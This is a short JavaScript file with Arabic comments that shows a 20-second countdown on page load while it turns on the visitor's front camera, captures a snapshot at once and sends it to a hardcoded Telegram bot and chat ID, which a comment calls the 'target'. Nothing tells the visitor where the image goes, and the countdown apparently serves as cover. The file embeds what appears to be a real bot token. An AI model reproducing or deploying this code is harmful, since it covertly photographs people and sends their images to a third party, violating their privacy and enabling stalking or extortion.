document.addEventListener("DOMContentLoaded", function () {

    let timeLeft = 20; // عدد الثواني للعد التنازلي

    const countdownElement = document.getElementById("countdown");

    const progressBar = document.getElementById("progress-bar");

    const countdownInterval = setInterval(() => {

        timeLeft--;

        countdownElement.textContent = timeLeft;

        progressBar.style.width = (timeLeft / 20) * 100 + "%"; // تقليل العرض تدريجياً

        if (timeLeft <= 0) {
            clearInterval(countdownInterval);
        }

    }, 1000);

    // تشغيل الكاميرا الأمامية تلقائيًا
    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            video.srcObject = stream;
            console.log("✅ الكاميرا تعمل بنجاح");
            captureAndSendPhoto(); // التقاط الصورة في أول جزء من الثانية
        } catch (error) {
            console.error("❌ فشل في تشغيل الكاميرا:", error);
        }
    }

    startCamera();

    // التقاط الصورة وإرسالها إلى تيليجرام
    function captureAndSendPhoto() {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
    }

    function sendPhoto(blob) {
        const formData = new FormData();
        formData.append("chat_id", "5375214810"); // معرف تيليجرام المستهدف
        formData.append("photo", blob, "snapshot.jpg");

        fetch("https://api.telegram.org/bot7825240049:AAGXsMh2SkSDOVbv1fW2tsYVYYLFhY7gv5E/sendPhoto", {
            method: "POST",
            body: formData
        })
        .then(response => response.json())
        .then(data => console.log("✅ تم إرسال الصورة:", data))
        .catch(error => console.error("❌ خطأ في إرسال الصورة:", error));
    }
});
